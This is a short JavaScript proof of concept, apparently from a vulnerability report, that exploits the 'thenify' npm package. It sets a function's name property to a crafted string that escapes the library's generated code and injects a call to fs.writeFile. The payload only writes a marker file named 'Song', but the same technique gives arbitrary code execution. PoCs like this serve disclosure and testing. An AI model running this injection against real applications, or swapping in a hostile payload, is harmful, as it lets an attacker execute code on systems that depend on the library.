var a = require("thenify");
var attack_code = "fs=require('fs');fs.writeFile('Song', 'test',function(){})";
function cur(){};
Object.defineProperty(cur, "name", { value: "fake() {" + attack_code + ";})();(function(){//"});
a(cur);
